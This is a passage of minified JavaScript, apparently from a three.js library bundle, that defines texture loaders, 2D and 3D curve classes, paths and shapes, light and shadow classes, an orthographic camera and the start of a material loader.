is(this.manager);o.setCrossOrigin(this.crossOrigin),o.setPath(this.path);var a=0;function s(i){o.load(e[i],(function(e){r.images[i]=e,6===++a&&(r.needsUpdate=!0,t&&t(r))}),void 0,n)}for(var c=0;c<e.length;++c)s(c);return r}}),rs.prototype=Object.assign(Object.create(Qa.prototype),{constructor:rs,load:function(e,t,i,n){var r=new S,o=new is(this.manager);return o.setCrossOrigin(this.crossOrigin),o.setPath(this.path),o.load(e,(function(i){r.image=i;var n=e.search(/\.jpe?g($|\?)/i)>0||0===e.search(/^data\:image\/jpeg/);r.format=n?1022:1023,r.needsUpdate=!0,void 0!==t&&t(r)}),i,n),r}}),Object.assign(os.prototype,{getPoint:function(){return console.warn("THREE.Curve: .getPoint() not implemented."),null},getPointAt:function(e,t){var i=this.getUtoTmapping(e);return this.getPoint(i,t)},getPoints:function(e){void 0===e&&(e=5);for(var t=[],i=0;i<=e;i++)t.push(this.getPoint(i/e));return t},getSpacedPoints:function(e){void 0===e&&(e=5);for(var t=[],i=0;i<=e;i++)t.push(this.getPointAt(i/e));return t},getLength:function(){var e=this.getLengths();return e[e.length-1]},getLengths:function(e){if(void 0===e&&(e=this.arcLengthDivisions),this.cacheArcLengths&&this.cacheArcLengths.length===e+1&&!this.needsUpdate)return this.cacheArcLengths;this.needsUpdate=!1;var t,i,n=[],r=this.getPoint(0),o=0;for(n.push(0),i=1;i<=e;i++)o+=(t=this.getPoint(i/e)).distanceTo(r),n.push(o),r=t;return this.cacheArcLengths=n,n},updateArcLengths:function(){this.needsUpdate=!0,this.getLengths()},getUtoTmapping:function(e,t){var i,n=this.getLengths(),r=0,o=n.length;i=t||e*n[o-1];for(var a,s=0,c=o-1;s<=c;)if((a=n[r=Math.floor(s+(c-s)/2)]-i)<0)s=r+1;else{if(!(a>0)){c=r;break}c=r-1}if(n[r=c]===i)return r/(o-1);var l=n[r];return(r+(i-l)/(n[r+1]-l))/(o-1)},getTangent:function(e){var t=e-1e-4,i=e+1e-4;t<0&&(t=0),i>1&&(i=1);var n=this.getPoint(t);return this.getPoint(i).clone().sub(n).normalize()},getTangentAt:function(e){var t=this.getUtoTmapping(e);return this.getTangent(t)},computeFrenetFrames:function(e,t){var i,n,r,o=new y,a=[],s=[],c=[],l=new y,h=new B;for(i=0;i<=e;i++)n=i/e,a[i]=this.getTangentAt(n),a[i].normalize();s[0]=new y,c[0]=new y;var u=Number.MAX_VALUE,d=Math.abs(a[0].x),f=Math.abs(a[0].y),m=Math.abs(a[0].z);for(d<=u&&(u=d,o.set(1,0,0)),f<=u&&(u=f,o.set(0,1,0)),m<=u&&o.set(0,0,1),l.crossVectors(a[0],o).normalize(),s[0].crossVectors(a[0],l),c[0].crossVectors(a[0],s[0]),i=1;i<=e;i++)s[i]=s[i-1].clone(),c[i]=c[i-1].clone(),l.crossVectors(a[i-1],a[i]),l.length()>Number.EPSILON&&(l.normalize(),r=Math.acos(p.clamp(a[i-1].dot(a[i]),-1,1)),s[i].applyMatrix4(h.makeRotationAxis(l,r))),c[i].crossVectors(a[i],s[i]);if(!0===t)for(r=Math.acos(p.clamp(s[0].dot(s[e]),-1,1)),r/=e,a[0].dot(l.crossVectors(s[0],s[e]))>0&&(r=-r),i=1;i<=e;i++)s[i].applyMatrix4(h.makeRotationAxis(a[i],r*i)),c[i].crossVectors(a[i],s[i]);return{tangents:a,normals:s,binormals:c}},clone:function(){return(new this.constructor).copy(this)},copy:function(e){return this.arcLengthDivisions=e.arcLengthDivisions,this},toJSON:function(){var e={metadata:{version:4.5,type:"Curve",generator:"Curve.toJSON"}};return e.arcLengthDivisions=this.arcLengthDivisions,e.type=this.type,e},fromJSON:function(e){return this.arcLengthDivisions=e.arcLengthDivisions,this}}),as.prototype=Object.create(os.prototype),as.prototype.constructor=as,as.prototype.isEllipseCurve=!0,as.prototype.getPoint=function(e,t){for(var i=t||new f,n=2*Math.PI,r=this.aEndAngle-this.aStartAngle,o=Math.abs(r)<Number.EPSILON;r<0;)r+=n;for(;r>n;)r-=n;r<Number.EPSILON&&(r=o?0:n),!0!==this.aClockwise||o||(r===n?r=-n:r-=n);var a=this.aStartAngle+e*r,s=this.aX+this.xRadius*Math.cos(a),c=this.aY+this.yRadius*Math.sin(a);if(0!==this.aRotation){var l=Math.cos(this.aRotation),h=Math.sin(this.aRotation),u=s-this.aX,d=c-this.aY;s=u*l-d*h+this.aX,c=u*h+d*l+this.aY}return i.set(s,c)},as.prototype.copy=function(e){return os.prototype.copy.call(this,e),this.aX=e.aX,this.aY=e.aY,this.xRadius=e.xRadius,this.yRadius=e.yRadius,this.aStartAngle=e.aStartAngle,this.aEndAngle=e.aEndAngle,this.aClockwise=e.aClockwise,this.aRotation=e.aRotation,this},as.prototype.toJSON=function(){var e=os.prototype.toJSON.call(this);return e.aX=this.aX,e.aY=this.aY,e.xRadius=this.xRadius,e.yRadius=this.yRadius,e.aStartAngle=this.aStartAngle,e.aEndAngle=this.aEndAngle,e.aClockwise=this.aClockwise,e.aRotation=this.aRotation,e},as.prototype.fromJSON=function(e){return os.prototype.fromJSON.call(this,e),this.aX=e.aX,this.aY=e.aY,this.xRadius=e.xRadius,this.yRadius=e.yRadius,this.aStartAngle=e.aStartAngle,this.aEndAngle=e.aEndAngle,this.aClockwise=e.aClockwise,this.aRotation=e.aRotation,this},ss.prototype=Object.create(as.prototype),ss.prototype.constructor=ss,ss.prototype.isArcCurve=!0;var ls=new y,hs=new cs,us=new cs,ds=new cs;function ps(e,t,i,n){os.call(this),this.type="CatmullRomCurve3",this.points=e||[],this.closed=t||!1,this.curveType=i||"centripetal",this.tension=n||.5}function fs(e,t,i,n,r){var o=.5*(n-t),a=.5*(r-i),s=e*e;return(2*i-2*n+o+a)*(e*s)+(-3*i+3*n-2*o-a)*s+o*e+i}function ms(e,t,i,n){return function(e,t){var i=1-e;return i*i*t}(e,t)+function(e,t){return 2*(1-e)*e*t}(e,i)+function(e,t){return e*e*t}(e,n)}function vs(e,t,i,n,r){return function(e,t){var i=1-e;return i*i*i*t}(e,t)+function(e,t){var i=1-e;return 3*i*i*e*t}(e,i)+function(e,t){return 3*(1-e)*e*e*t}(e,n)+function(e,t){return e*e*e*t}(e,r)}function gs(e,t,i,n){os.call(this),this.type="CubicBezierCurve",this.v0=e||new f,this.v1=t||new f,this.v2=i||new f,this.v3=n||new f}function ys(e,t,i,n){os.call(this),this.type="CubicBezierCurve3",this.v0=e||new y,this.v1=t||new y,this.v2=i||new y,this.v3=n||new y}function bs(e,t){os.call(this),this.type="LineCurve",this.v1=e||new f,this.v2=t||new f}function ws(e,t){os.call(this),this.type="LineCurve3",this.v1=e||new y,this.v2=t||new y}function xs(e,t,i){os.call(this),this.type="QuadraticBezierCurve",this.v0=e||new f,this.v1=t||new f,this.v2=i||new f}function _s(e,t,i){os.call(this),this.type="QuadraticBezierCurve3",this.v0=e||new y,this.v1=t||new y,this.v2=i||new y}function Ms(e){os.call(this),this.type="SplineCurve",this.points=e||[]}ps.prototype=Object.create(os.prototype),ps.prototype.constructor=ps,ps.prototype.isCatmullRomCurve3=!0,ps.prototype.getPoint=function(e,t){var i,n,r,o,a=t||new y,s=this.points,c=s.length,l=(c-(this.closed?0:1))*e,h=Math.floor(l),u=l-h;if(this.closed?h+=h>0?0:(Math.floor(Math.abs(h)/c)+1)*c:0===u&&h===c-1&&(h=c-2,u=1),this.closed||h>0?i=s[(h-1)%c]:(ls.subVectors(s[0],s[1]).add(s[0]),i=ls),n=s[h%c],r=s[(h+1)%c],this.closed||h+2<c?o=s[(h+2)%c]:(ls.subVectors(s[c-1],s[c-2]).add(s[c-1]),o=ls),"centripetal"===this.curveType||"chordal"===this.curveType){var d="chordal"===this.curveType?.5:.25,p=Math.pow(i.distanceToSquared(n),d),f=Math.pow(n.distanceToSquared(r),d),m=Math.pow(r.distanceToSquared(o),d);f<1e-4&&(f=1),p<1e-4&&(p=f),m<1e-4&&(m=f),hs.initNonuniformCatmullRom(i.x,n.x,r.x,o.x,p,f,m),us.initNonuniformCatmullRom(i.y,n.y,r.y,o.y,p,f,m),ds.initNonuniformCatmullRom(i.z,n.z,r.z,o.z,p,f,m)}else"catmullrom"===this.curveType&&(hs.initCatmullRom(i.x,n.x,r.x,o.x,this.tension),us.initCatmullRom(i.y,n.y,r.y,o.y,this.tension),ds.initCatmullRom(i.z,n.z,r.z,o.z,this.tension));return a.set(hs.calc(u),us.calc(u),ds.calc(u)),a},ps.prototype.copy=function(e){os.prototype.copy.call(this,e),this.points=[];for(var t=0,i=e.points.length;t<i;t++){var n=e.points[t];this.points.push(n.clone())}return this.closed=e.closed,this.curveType=e.curveType,this.tension=e.tension,this},ps.prototype.toJSON=function(){var e=os.prototype.toJSON.call(this);e.points=[];for(var t=0,i=this.points.length;t<i;t++){var n=this.points[t];e.points.push(n.toArray())}return e.closed=this.closed,e.curveType=this.curveType,e.tension=this.tension,e},ps.prototype.fromJSON=function(e){os.prototype.fromJSON.call(this,e),this.points=[];for(var t=0,i=e.points.length;t<i;t++){var n=e.points[t];this.points.push((new y).fromArray(n))}return this.closed=e.closed,this.curveType=e.curveType,this.tension=e.tension,this},gs.prototype=Object.create(os.prototype),gs.prototype.constructor=gs,gs.prototype.isCubicBezierCurve=!0,gs.prototype.getPoint=function(e,t){var i=t||new f,n=this.v0,r=this.v1,o=this.v2,a=this.v3;return i.set(vs(e,n.x,r.x,o.x,a.x),vs(e,n.y,r.y,o.y,a.y)),i},gs.prototype.copy=function(e){return os.prototype.copy.call(this,e),this.v0.copy(e.v0),this.v1.copy(e.v1),this.v2.copy(e.v2),this.v3.copy(e.v3),this},gs.prototype.toJSON=function(){var e=os.prototype.toJSON.call(this);return e.v0=this.v0.toArray(),e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e.v3=this.v3.toArray(),e},gs.prototype.fromJSON=function(e){return os.prototype.fromJSON.call(this,e),this.v0.fromArray(e.v0),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this.v3.fromArray(e.v3),this},ys.prototype=Object.create(os.prototype),ys.prototype.constructor=ys,ys.prototype.isCubicBezierCurve3=!0,ys.prototype.getPoint=function(e,t){var i=t||new y,n=this.v0,r=this.v1,o=this.v2,a=this.v3;return i.set(vs(e,n.x,r.x,o.x,a.x),vs(e,n.y,r.y,o.y,a.y),vs(e,n.z,r.z,o.z,a.z)),i},ys.prototype.copy=function(e){return os.prototype.copy.call(this,e),this.v0.copy(e.v0),this.v1.copy(e.v1),this.v2.copy(e.v2),this.v3.copy(e.v3),this},ys.prototype.toJSON=function(){var e=os.prototype.toJSON.call(this);return e.v0=this.v0.toArray(),e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e.v3=this.v3.toArray(),e},ys.prototype.fromJSON=function(e){return os.prototype.fromJSON.call(this,e),this.v0.fromArray(e.v0),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this.v3.fromArray(e.v3),this},bs.prototype=Object.create(os.prototype),bs.prototype.constructor=bs,bs.prototype.isLineCurve=!0,bs.prototype.getPoint=function(e,t){var i=t||new f;return 1===e?i.copy(this.v2):(i.copy(this.v2).sub(this.v1),i.multiplyScalar(e).add(this.v1)),i},bs.prototype.getPointAt=function(e,t){return this.getPoint(e,t)},bs.prototype.getTangent=function(){return this.v2.clone().sub(this.v1).normalize()},bs.prototype.copy=function(e){return os.prototype.copy.call(this,e),this.v1.copy(e.v1),this.v2.copy(e.v2),this},bs.prototype.toJSON=function(){var e=os.prototype.toJSON.call(this);return e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e},bs.prototype.fromJSON=function(e){return os.prototype.fromJSON.call(this,e),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this},ws.prototype=Object.create(os.prototype),ws.prototype.constructor=ws,ws.prototype.isLineCurve3=!0,ws.prototype.getPoint=function(e,t){var i=t||new y;return 1===e?i.copy(this.v2):(i.copy(this.v2).sub(this.v1),i.multiplyScalar(e).add(this.v1)),i},ws.prototype.getPointAt=function(e,t){return this.getPoint(e,t)},ws.prototype.copy=function(e){return os.prototype.copy.call(this,e),this.v1.copy(e.v1),this.v2.copy(e.v2),this},ws.prototype.toJSON=function(){var e=os.prototype.toJSON.call(this);return e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e},ws.prototype.fromJSON=function(e){return os.prototype.fromJSON.call(this,e),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this},xs.prototype=Object.create(os.prototype),xs.prototype.constructor=xs,xs.prototype.isQuadraticBezierCurve=!0,xs.prototype.getPoint=function(e,t){var i=t||new f,n=this.v0,r=this.v1,o=this.v2;return i.set(ms(e,n.x,r.x,o.x),ms(e,n.y,r.y,o.y)),i},xs.prototype.copy=function(e){return os.prototype.copy.call(this,e),this.v0.copy(e.v0),this.v1.copy(e.v1),this.v2.copy(e.v2),this},xs.prototype.toJSON=function(){var e=os.prototype.toJSON.call(this);return e.v0=this.v0.toArray(),e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e},xs.prototype.fromJSON=function(e){return os.prototype.fromJSON.call(this,e),this.v0.fromArray(e.v0),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this},_s.prototype=Object.create(os.prototype),_s.prototype.constructor=_s,_s.prototype.isQuadraticBezierCurve3=!0,_s.prototype.getPoint=function(e,t){var i=t||new y,n=this.v0,r=this.v1,o=this.v2;return i.set(ms(e,n.x,r.x,o.x),ms(e,n.y,r.y,o.y),ms(e,n.z,r.z,o.z)),i},_s.prototype.copy=function(e){return os.prototype.copy.call(this,e),this.v0.copy(e.v0),this.v1.copy(e.v1),this.v2.copy(e.v2),this},_s.prototype.toJSON=function(){var e=os.prototype.toJSON.call(this);return e.v0=this.v0.toArray(),e.v1=this.v1.toArray(),e.v2=this.v2.toArray(),e},_s.prototype.fromJSON=function(e){return os.prototype.fromJSON.call(this,e),this.v0.fromArray(e.v0),this.v1.fromArray(e.v1),this.v2.fromArray(e.v2),this},Ms.prototype=Object.create(os.prototype),Ms.prototype.constructor=Ms,Ms.prototype.isSplineCurve=!0,Ms.prototype.getPoint=function(e,t){var i=t||new f,n=this.points,r=(n.length-1)*e,o=Math.floor(r),a=r-o,s=n[0===o?o:o-1],c=n[o],l=n[o>n.length-2?n.length-1:o+1],h=n[o>n.length-3?n.length-1:o+2];return i.set(fs(a,s.x,c.x,l.x,h.x),fs(a,s.y,c.y,l.y,h.y)),i},Ms.prototype.copy=function(e){os.prototype.copy.call(this,e),this.points=[];for(var t=0,i=e.points.length;t<i;t++){var n=e.points[t];this.points.push(n.clone())}return this},Ms.prototype.toJSON=function(){var e=os.prototype.toJSON.call(this);e.points=[];for(var t=0,i=this.points.length;t<i;t++){var n=this.points[t];e.points.push(n.toArray())}return e},Ms.prototype.fromJSON=function(e){os.prototype.fromJSON.call(this,e),this.points=[];for(var t=0,i=e.points.length;t<i;t++){var n=e.points[t];this.points.push((new f).fromArray(n))}return this};var Ss=Object.freeze({__proto__:null,ArcCurve:ss,CatmullRomCurve3:ps,CubicBezierCurve:gs,CubicBezierCurve3:ys,EllipseCurve:as,LineCurve:bs,LineCurve3:ws,QuadraticBezierCurve:xs,QuadraticBezierCurve3:_s,SplineCurve:Ms});function Ts(){os.call(this),this.type="CurvePath",this.curves=[],this.autoClose=!1}function Es(e){Ts.call(this),this.type="Path",this.currentPoint=new f,e&&this.setFromPoints(e)}function As(e){Es.call(this,e),this.uuid=p.generateUUID(),this.type="Shape",this.holes=[]}function Cs(e,t){K.call(this),this.type="Light",this.color=new Ne(e),this.intensity=void 0!==t?t:1,this.receiveShadow=void 0}function Ps(e,t,i){Cs.call(this,e,i),this.type="HemisphereLight",this.castShadow=void 0,this.position.copy(K.DefaultUp),this.updateMatrix(),this.groundColor=new Ne(t)}function Ls(e){this.camera=e,this.bias=0,this.radius=1,this.mapSize=new f(512,512),this.map=null,this.mapPass=null,this.matrix=new B,this._frustum=new ei,this._frameExtents=new f(1,1),this._viewportCount=1,this._viewports=[new T(0,0,1,1)]}function Rs(){Ls.call(this,new Gt(50,1,.5,500))}function ks(e,t,i,n,r,o){Cs.call(this,e,t),this.type="SpotLight",this.position.copy(K.DefaultUp),this.updateMatrix(),this.target=new K,Object.defineProperty(this,"power",{get:function(){return this.intensity*Math.PI},set:function(e){this.intensity=e/Math.PI}}),this.distance=void 0!==i?i:0,this.angle=void 0!==n?n:Math.PI/3,this.penumbra=void 0!==r?r:0,this.decay=void 0!==o?o:1,this.shadow=new Rs}function Os(){Ls.call(this,new Gt(90,1,.5,500)),this._frameExtents=new f(4,2),this._viewportCount=6,this._viewports=[new T(2,1,1,1),new T(0,1,1,1),new T(3,1,1,1),new T(1,1,1,1),new T(3,0,1,1),new T(1,0,1,1)],this._cubeDirections=[new y(1,0,0),new y(-1,0,0),new y(0,0,1),new y(0,0,-1),new y(0,1,0),new y(0,-1,0)],this._cubeUps=[new y(0,1,0),new y(0,1,0),new y(0,1,0),new y(0,1,0),new y(0,0,1),new y(0,0,-1)]}function Is(e,t,i,n){Cs.call(this,e,t),this.type="PointLight",Object.defineProperty(this,"power",{get:function(){return 4*this.intensity*Math.PI},set:function(e){this.intensity=e/(4*Math.PI)}}),this.distance=void 0!==i?i:0,this.decay=void 0!==n?n:1,this.shadow=new Os}function Bs(e,t,i,n,r,o){Ht.call(this),this.type="OrthographicCamera",this.zoom=1,this.view=null,this.left=void 0!==e?e:-1,this.right=void 0!==t?t:1,this.top=void 0!==i?i:1,this.bottom=void 0!==n?n:-1,this.near=void 0!==r?r:.1,this.far=void 0!==o?o:2e3,this.updateProjectionMatrix()}function Ds(){Ls.call(this,new Bs(-5,5,5,-5,.5,500))}function zs(e,t){Cs.call(this,e,t),this.type="DirectionalLight",this.position.copy(K.DefaultUp),this.updateMatrix(),this.target=new K,this.shadow=new Ds}function Fs(e,t){Cs.call(this,e,t),this.type="AmbientLight",this.castShadow=void 0}function Ns(e,t,i,n){Cs.call(this,e,t),this.type="RectAreaLight",this.width=void 0!==i?i:10,this.height=void 0!==n?n:10}function js(e){Qa.call(this,e),this.textures={}}Ts.prototype=Object.assign(Object.create(os.prototype),{constructor:Ts,add:function(e){this.curves.push(e)},closePath:function(){var e=this.curves[0].getPoint(0),t=this.curves[this.curves.length-1].getPoint(1);e.equals(t)||this.curves.push(new bs(t,e))},getPoint:function(e){for(var t=e*this.getLength(),i=this.getCurveLengths(),n=0;n<i.length;){if(i[n]>=t){var r=i[n]-t,o=this.curves[n],a=o.getLength(),s=0===a?0:1-r/a;return o.getPointAt(s)}n++}return null},getLength:function(){var e=this.getCurveLengths();return e[e.length-1]},updateArcLengths:function(){this.needsUpdate=!0,this.cacheLengths=null,this.getCurveLengths()},getCurveLengths:function(){if(this.cacheLengths&&this.cacheLengths.length===this.curves.length)return this.cacheLengths;for(var e=[],t=0,i=0,n=this.curves.length;i<n;i++)t+=this.curves[i].getLength(),e.push(t);return this.cacheLengths=e,e},getSpacedPoints:function(e){void 0===e&&(e=40);for(var t=[],i=0;i<=e;i++)t.push(this.getPoint(i/e));return this.autoClose&&t.push(t[0]),t},getPoints:function(e){e=e||12;for(var t,i=[],n=0,r=this.curves;n<r.length;n++)for(var o=r[n],a=o&&o.isEllipseCurve?2*e:o&&(o.isLineCurve||o.isLineCurve3)?1:o&&o.isSplineCurve?e*o.points.length:e,s=o.getPoints(a),c=0;c<s.length;c++){var l=s[c];t&&t.equals(l)||(i.push(l),t=l)}return this.autoClose&&i.length>1&&!i[i.length-1].equals(i[0])&&i.push(i[0]),i},copy:function(e){os.prototype.copy.call(this,e),this.curves=[];for(var t=0,i=e.curves.length;t<i;t++){var n=e.curves[t];this.curves.push(n.clone())}return this.autoClose=e.autoClose,this},toJSON:function(){var e=os.prototype.toJSON.call(this);e.autoClose=this.autoClose,e.curves=[];for(var t=0,i=this.curves.length;t<i;t++){var n=this.curves[t];e.curves.push(n.toJSON())}return e},fromJSON:function(e){os.prototype.fromJSON.call(this,e),this.autoClose=e.autoClose,this.curves=[];for(var t=0,i=e.curves.length;t<i;t++){var n=e.curves[t];this.curves.push((new Ss[n.type]).fromJSON(n))}return this}}),Es.prototype=Object.assign(Object.create(Ts.prototype),{constructor:Es,setFromPoints:function(e){this.moveTo(e[0].x,e[0].y);for(var t=1,i=e.length;t<i;t++)this.lineTo(e[t].x,e[t].y)},moveTo:function(e,t){this.currentPoint.set(e,t)},lineTo:function(e,t){var i=new bs(this.currentPoint.clone(),new f(e,t));this.curves.push(i),this.currentPoint.set(e,t)},quadraticCurveTo:function(e,t,i,n){var r=new xs(this.currentPoint.clone(),new f(e,t),new f(i,n));this.curves.push(r),this.currentPoint.set(i,n)},bezierCurveTo:function(e,t,i,n,r,o){var a=new gs(this.currentPoint.clone(),new f(e,t),new f(i,n),new f(r,o));this.curves.push(a),this.currentPoint.set(r,o)},splineThru:function(e){var t=new Ms([this.currentPoint.clone()].concat(e));this.curves.push(t),this.currentPoint.copy(e[e.length-1])},arc:function(e,t,i,n,r,o){var a=this.currentPoint.x,s=this.currentPoint.y;this.absarc(e+a,t+s,i,n,r,o)},absarc:function(e,t,i,n,r,o){this.absellipse(e,t,i,i,n,r,o)},ellipse:function(e,t,i,n,r,o,a,s){var c=this.currentPoint.x,l=this.currentPoint.y;this.absellipse(e+c,t+l,i,n,r,o,a,s)},absellipse:function(e,t,i,n,r,o,a,s){var c=new as(e,t,i,n,r,o,a,s);if(this.curves.length>0){var l=c.getPoint(0);l.equals(this.currentPoint)||this.lineTo(l.x,l.y)}this.curves.push(c);var h=c.getPoint(1);this.currentPoint.copy(h)},copy:function(e){return Ts.prototype.copy.call(this,e),this.currentPoint.copy(e.currentPoint),this},toJSON:function(){var e=Ts.prototype.toJSON.call(this);return e.currentPoint=this.currentPoint.toArray(),e},fromJSON:function(e){return Ts.prototype.fromJSON.call(this,e),this.currentPoint.fromArray(e.currentPoint),this}}),As.prototype=Object.assign(Object.create(Es.prototype),{constructor:As,getPointsHoles:function(e){for(var t=[],i=0,n=this.holes.length;i<n;i++)t[i]=this.holes[i].getPoints(e);return t},extractPoints:function(e){return{shape:this.getPoints(e),holes:this.getPointsHoles(e)}},copy:function(e){Es.prototype.copy.call(this,e),this.holes=[];for(var t=0,i=e.holes.length;t<i;t++){var n=e.holes[t];this.holes.push(n.clone())}return this},toJSON:function(){var e=Es.prototype.toJSON.call(this);e.uuid=this.uuid,e.holes=[];for(var t=0,i=this.holes.length;t<i;t++){var n=this.holes[t];e.holes.push(n.toJSON())}return e},fromJSON:function(e){Es.prototype.fromJSON.call(this,e),this.uuid=e.uuid,this.holes=[];for(var t=0,i=e.holes.length;t<i;t++){var n=e.holes[t];this.holes.push((new Es).fromJSON(n))}return this}}),Cs.prototype=Object.assign(Object.create(K.prototype),{constructor:Cs,isLight:!0,copy:function(e){return K.prototype.copy.call(this,e),this.color.copy(e.color),this.intensity=e.intensity,this},toJSON:function(e){var t=K.prototype.toJSON.call(this,e);return t.object.color=this.color.getHex(),t.object.intensity=this.intensity,void 0!==this.groundColor&&(t.object.groundColor=this.groundColor.getHex()),void 0!==this.distance&&(t.object.distance=this.distance),void 0!==this.angle&&(t.object.angle=this.angle),void 0!==this.decay&&(t.object.decay=this.decay),void 0!==this.penumbra&&(t.object.penumbra=this.penumbra),void 0!==this.shadow&&(t.object.shadow=this.shadow.toJSON()),t}}),Ps.prototype=Object.assign(Object.create(Cs.prototype),{constructor:Ps,isHemisphereLight:!0,copy:function(e){return Cs.prototype.copy.call(this,e),this.groundColor.copy(e.groundColor),this}}),Object.assign(Ls.prototype,{_projScreenMatrix:new B,_lightPositionWorld:new y,_lookTarget:new y,getViewportCount:function(){return this._viewportCount},getFrustum:function(){return this._frustum},updateMatrices:function(e){var t=this.camera,i=this.matrix,n=this._projScreenMatrix,r=this._lookTarget,o=this._lightPositionWorld;o.setFromMatrixPosition(e.matrixWorld),t.position.copy(o),r.setFromMatrixPosition(e.target.matrixWorld),t.lookAt(r),t.updateMatrixWorld(),n.multiplyMatrices(t.projectionMatrix,t.matrixWorldInverse),this._frustum.setFromMatrix(n),i.set(.5,0,0,.5,0,.5,0,.5,0,0,.5,.5,0,0,0,1),i.multiply(t.projectionMatrix),i.multiply(t.matrixWorldInverse)},getViewport:function(e){return this._viewports[e]},getFrameExtents:function(){return this._frameExtents},copy:function(e){return this.camera=e.camera.clone(),this.bias=e.bias,this.radius=e.radius,this.mapSize.copy(e.mapSize),this},clone:function(){return(new this.constructor).copy(this)},toJSON:function(){var e={};return 0!==this.bias&&(e.bias=this.bias),1!==this.radius&&(e.radius=this.radius),512===this.mapSize.x&&512===this.mapSize.y||(e.mapSize=this.mapSize.toArray()),e.camera=this.camera.toJSON(!1).object,delete e.camera.matrix,e}}),Rs.prototype=Object.assign(Object.create(Ls.prototype),{constructor:Rs,isSpotLightShadow:!0,updateMatrices:function(e,t,i){var n=this.camera,r=2*p.RAD2DEG*e.angle,o=this.mapSize.width/this.mapSize.height,a=e.distance||n.far;r===n.fov&&o===n.aspect&&a===n.far||(n.fov=r,n.aspect=o,n.far=a,n.updateProjectionMatrix()),Ls.prototype.updateMatrices.call(this,e,t,i)}}),ks.prototype=Object.assign(Object.create(Cs.prototype),{constructor:ks,isSpotLight:!0,copy:function(e){return Cs.prototype.copy.call(this,e),this.distance=e.distance,this.angle=e.angle,this.penumbra=e.penumbra,this.decay=e.decay,this.target=e.target.clone(),this.shadow=e.shadow.clone(),this}}),Os.prototype=Object.assign(Object.create(Ls.prototype),{constructor:Os,isPointLightShadow:!0,updateMatrices:function(e,t,i){var n=this.camera,r=this.matrix,o=this._lightPositionWorld,a=this._lookTarget,s=this._projScreenMatrix;o.setFromMatrixPosition(e.matrixWorld),n.position.copy(o),a.copy(n.position),a.add(this._cubeDirections[i]),n.up.copy(this._cubeUps[i]),n.lookAt(a),n.updateMatrixWorld(),r.makeTranslation(-o.x,-o.y,-o.z),s.multiplyMatrices(n.projectionMatrix,n.matrixWorldInverse),this._frustum.setFromMatrix(s)}}),Is.prototype=Object.assign(Object.create(Cs.prototype),{constructor:Is,isPointLight:!0,copy:function(e){return Cs.prototype.copy.call(this,e),this.distance=e.distance,this.decay=e.decay,this.shadow=e.shadow.clone(),this}}),Bs.prototype=Object.assign(Object.create(Ht.prototype),{constructor:Bs,isOrthographicCamera:!0,copy:function(e,t){return Ht.prototype.copy.call(this,e,t),this.left=e.left,this.right=e.right,this.top=e.top,this.bottom=e.bottom,this.near=e.near,this.far=e.far,this.zoom=e.zoom,this.view=null===e.view?null:Object.assign({},e.view),this},setViewOffset:function(e,t,i,n,r,o){null===this.view&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=e,this.view.fullHeight=t,this.view.offsetX=i,this.view.offsetY=n,this.view.width=r,this.view.height=o,this.updateProjectionMatrix()},clearViewOffset:function(){null!==this.view&&(this.view.enabled=!1),this.updateProjectionMatrix()},updateProjectionMatrix:function(){var e=(this.right-this.left)/(2*this.zoom),t=(this.top-this.bottom)/(2*this.zoom),i=(this.right+this.left)/2,n=(this.top+this.bottom)/2,r=i-e,o=i+e,a=n+t,s=n-t;if(null!==this.view&&this.view.enabled){var c=this.zoom/(this.view.width/this.view.fullWidth),l=this.zoom/(this.view.height/this.view.fullHeight),h=(this.right-this.left)/this.view.width,u=(this.top-this.bottom)/this.view.height;o=(r+=h*(this.view.offsetX/c))+h*(this.view.width/c),s=(a-=u*(this.view.offsetY/l))-u*(this.view.height/l)}this.projectionMatrix.makeOrthographic(r,o,a,s,this.near,this.far),this.projectionMatrixInverse.getInverse(this.projectionMatrix)},toJSON:function(e){var t=K.prototype.toJSON.call(this,e);return t.object.zoom=this.zoom,t.object.left=this.left,t.object.right=this.right,t.object.top=this.top,t.object.bottom=this.bottom,t.object.near=this.near,t.object.far=this.far,null!==this.view&&(t.object.view=Object.assign({},this.view)),t}}),Ds.prototype=Object.assign(Object.create(Ls.prototype),{constructor:Ds,isDirectionalLightShadow:!0,updateMatrices:function(e,t,i){Ls.prototype.updateMatrices.call(this,e,t,i)}}),zs.prototype=Object.assign(Object.create(Cs.prototype),{constructor:zs,isDirectionalLight:!0,copy:function(e){return Cs.prototype.copy.call(this,e),this.target=e.target.clone(),this.shadow=e.shadow.clone(),this}}),Fs.prototype=Object.assign(Object.create(Cs.prototype),{constructor:Fs,isAmbientLight:!0}),Ns.prototype=Object.assign(Object.create(Cs.prototype),{constructor:Ns,isRectAreaLight:!0,copy:function(e){return Cs.prototype.copy.call(this,e),this.width=e.width,this.height=e.height,this},toJSON:function(e){var t=Cs.prototype.toJSON.call(this,e);return t.object.width=this.width,t.object.height=this.height,t}}),js.prototype=Object.assign(Object.create(Qa.prototype),{constructor:js,load:function(e,t,i,n){var r=this,o=new Ja(r.manager);o.setPath(r.path),o.load(e,(function(e){t(r.parse(JSON.parse(e)))}),i,n)},parse:function(e){var t=this.textures;function i(e){return void 0===t[e]&&console.warn("THREE.MaterialLoader: Undefined texture",e),t[e]}var n=new Ra[e.type];if(void 0!==e.uuid&&(n.uuid=e.uuid),void 0!==e.name&&(n.name=e.name),void 0!==e.color&&n.color.setHex(e.color),void 0!==e.roughness&&(n.roughness=e.roughness),void 0!==e.metalness&&(n.metalness=e.metalness),void 0!==e.sheen&&(n.sheen=(new Ne).setHex(e.sheen)),void 0!==e.emissive&&n.emissive.setHex(e.emissive),void 0!==e.specular&&n.specular.setHex(e.specular),void 0!==e.shininess&&(n.shininess=e.shininess),void 0!==e.clearcoat&&(n.clearcoat=e.clearcoat),void 0!==e.clearcoatRoughness&&(n.clearcoatRoughness=e.clearcoatRoughness),void 0!==e.vertexColors&&(n.vertexColors=e.vertexColors),void 